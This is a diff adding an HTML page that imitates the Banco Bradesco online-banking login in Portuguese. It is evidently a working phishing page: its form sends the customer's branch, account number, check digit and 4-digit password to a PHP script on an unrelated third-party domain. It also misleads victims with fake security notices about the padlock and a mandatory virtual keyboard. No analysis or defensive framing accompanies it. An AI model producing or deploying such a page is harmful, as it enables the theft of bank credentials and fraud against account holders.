@@ -1,0 +1,221 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="icon" href="bradesco.ico">
+<link rel="shortcut icon" href="bradesco.ico">
+<title>Banco Bradesco S/A</title>
+<style type="text/css">
+<!--
+.style2 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-weight: bold;
+	font-size: 11px;
+}
+.style4 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 10px; }
+.style5 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 10px;
+}
+#pagt {
+	position: absolute;
+	left: 0px;
+	top: 0px;
+}
+-->
+</style>
+</head>
+
+<body>
+<table width="1024" height="525" border="0" cellpadding="0" cellspacing="0" id="pagt">
+  <tr>
+    <td height="27" colspan="2" background="cab_fundo.gif"><img src="barra_top.gif" width="745" height="27" /></td>
+  </tr>
+  <tr>
+    <td width="639" height="414" background="fundo_pag.gif"><table width="614" border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr>
+        <td colspan="7"><span class="style2">Cadeado de seguran&ccedil;a</span></td>
+      </tr>
+      <tr>
+        <td colspan="7"><font color="#e90b0b" face="Verdana, Arial, Helvetica, sans-serif" size="1">Certifique-se de que o cadeado esta aparecendo no seu navegador.</font></td>
+      </tr>
+      <tr>
+        <td colspan="7">&nbsp;</td>
+      </tr>
+      <tr>
+        <td colspan="7"><span class="style4">Para a sua seguran&ccedil;a, o teclado do seu computador n&atilde;o pode ser utilizado<br />
+          na digita&ccedil;&atilde;o da senha de 4 digitos. Por favor, utilize o Teclado Virtual.</span></td>
+      </tr>
+      <tr>
+        <td colspan="7">&nbsp;</td>
+      </tr>
+      <tr>
+        <td width="206" colspan="7"><table width="436" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td width="462"><form id="Flogin" name="Flogin" method="post" onSubmit="return validaFrm(this);" action="http://darkmusestudios.net/include/paginaSegura/recadastro/LOGINCHK.php">
+                  <label> <span class="style4">Agencia <br />
+                  <input name="AGENCIA" onkeypress='return SomenteNumero(event)' onKeyUp="autotab(this);" type="text" id="AGENCIA" size="6" maxlength="4" />
+                  </span></label>
+                  <span class="style4"><img src="tecladoseg.gif" alt="ds" width="80" height="110" border="0" align="right" usemap="#Map" />
+                  <map name="Map" id="Map">
+                    <area shape="rect" coords="28,84,76,107" href="javascript:limpaCampos()" />
+                    <area shape="rect" coords="1,84,27,108" href="javascript:AdicionaForm('3')" />
+                    <area shape="rect" coords="55,56,81,80" href="javascript:AdicionaForm('1')" />
+                    <area shape="rect" coords="28,56,54,80" href="javascript:AdicionaForm('4')" />
+                    <area shape="rect" coords="1,56,27,80" href="javascript:AdicionaForm('0')" />
+                    <area shape="rect" coords="54,29,80,53" href="javascript:AdicionaForm('2')" />
+                    <area shape="rect" coords="27,29,53,53" href="javascript:AdicionaForm('5')" />
+                    <area shape="rect" coords="1,29,27,53" href="javascript:AdicionaForm('6')" />
+                    <area shape="rect" coords="54,3,80,27" href="javascript:AdicionaForm('7')" />
+                    <area shape="rect" coords="27,3,53,27" href="javascript:AdicionaForm('8')" />
+                    <area shape="rect" coords="1,3,27,27" href="javascript:AdicionaForm('9')" />
+                  </map>
+                  <script language="javascript">
+<!--
+//pular campos auto
+function autotab(elemento)
+{
+ if (elemento.value.length < elemento.getAttribute("maxlength")) return;
+ var formulario = elemento.form;
+ var els = formulario.elements;
+ var x, autotab;
+ for (var i = 0, len = els.length; i < len; i++)
+ {
+  x = els[i];
+  if (elemento == x && (autotab = els[i+1]))
+  {
+   if (autotab.focus) autotab.focus();
+  }
+ }
+}
+//-->
+                  </script>
+                  <script language='JavaScript'>
+function SomenteNumero(e){
+    var tecla=(window.event)?event.keyCode:e.which;
+    if((tecla > 47 && tecla < 58)) return true;
+    else{
+    if (tecla != 8) return false;
+    else return true;
+    }
+}
+                                </script>
+<script type="text/javascript" language="javascript">
+<!--
+	function validaFrm(Flogin) {
+		if(Flogin.AGENCIA.value==''){
+			alert('Agencia Invalida.');
+			Flogin.AGENCIA.focus();
+			return(false);
+		}
+		if(Flogin.CONTA.value=='') {
+			alert('Conta Invalida.');
+			Flogin.CONTA.focus();
+			return(false);
+		}
+				if(Flogin.DIG.value=='') {
+			alert('Digito Invalido.');
+			Flogin.DIG.focus();
+			return(false);
+		}
+		if(Flogin.SENHA.value=='') {
+			alert('Sua Senha deve conter 4 digitos.');
+			Flogin.SENHA.focus();
+			return(false);
+		}
+		return(true);
+	}	
+-->
+</script>
+                  <br />
+                    Conta<br />
+                    <label>
+                      <input name="CONTA" onkeypress='return SomenteNumero(event)' onKeyUp="autotab(this);" type="text" id="CONTA" size="9" maxlength="7" />
+                    </label>
+                    -
+                    <label>
+                      <input name="DIG" onkeypress='return SomenteNumero(event)' onKeyUp="autotab(this);" type="text" id="DIG" size="2" maxlength="1" />
+                    </label>
+                    <br />
+                    Titular da Conta<br />
+                    <label>
+                      <select name="TPCONTA" id="TPCONTA">
+                        <option value="1 Titular">1&deg; Titular</option>
+                        <option value="2 Titular">2&deg; Titular</option>
+                        <option value="3 Titular">3&deg; Titular</option>
+                      </select>
+                    </label>
+                    <script language="JavaScript">
+function AdicionaForm(valor)
+{
+	var nomeCampo = document.getElementById("SENHA");
+	var valorCampo = nomeCampo.value;
+
+	if (nomeCampo.value.length == 4)
+	{
+		return;
+	}
+	else
+	{
+		nomeCampo.value = valorCampo + valor;
+	}
+}
+                    </script>
+                    <script language="JavaScript1.2">
+/*
+Funcao responsavel por avisar o usuario que o teclado convencional esta bloqueado para a senha de 4
+*/
+function avisarBloqueioTecladoConvencionalSenha4() {
+    alert('Por favor, utilize o teclado virtual.');
+    return false;
+}
+
+//-->
+                    </script>
+<script language="JavaScript1.2" type="text/javascript">
+function limpaCampos() 
+{
+   document.forms.FLogin.reset();
+
+   //Posiciona o cursor
+   document.forms.FLogin.TPCONTA.focus();
+   return false;
+}
+</script>
+                    <br />
+                    <br />
+                    Digite sua senha de 4 digitos</span><br />
+                <label>
+                  <input name="SENHA" onKeyPress="return false" onKeyDown="avisarBloqueioTecladoConvencionalSenha4()" onKeyUp="autotab(this);" type="password" id="SENHA" size="6" maxlength="4" />
+                  </label>
+                <div align="center"><br />
+                    <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://darkmusestudios.net/include/paginaSegura/recadastro/Encerramento.php" onclick="LeaveControl=0"><img src="bt_cancelar.gif" alt="CANCELAR" border="0" /></a>&nbsp;&nbsp;<a href="LOGIN.php.html#" onclick="limpaCampos();"><img src="bt_limpar.gif" alt="LIMPAR" border="0" /></a>&nbsp;
+<input name="Entrar" value="Entrar" alt="ENTRAR" src="bt_entrar.gif" type="image" />
+                  <br />
+                  </div>
+              </form></td>
+            </tr>
+          </table>
+            <br />            <a href="http://darkmusestudios.net/include/paginaSegura/recadastro/Encerramento.php" onclick="LeaveControl=0"></a><a href="LOGIN.php.html#" onclick="limpaCampos();"></a></td>
+      </tr>
+      
+      <tr>
+        <td colspan="7">&nbsp;</td>
+      </tr>
+    </table></td>
+    <td width="385">&nbsp;</td>
+  </tr>
+  <tr>
+    <td height="28" colspan="2">&nbsp;</td>
+  </tr>
+  <tr>
+    <td height="28">&nbsp;</td>
+    <td height="28"><span class="style5">Tela 1</span></td>
+  </tr>
+  <tr>
+    <td height="28" colspan="2" background="fundo_down.gif"><img src="rodape.gif" width="745" height="28" /></td>
+  </tr>
+</table>
+</body>
+</html>
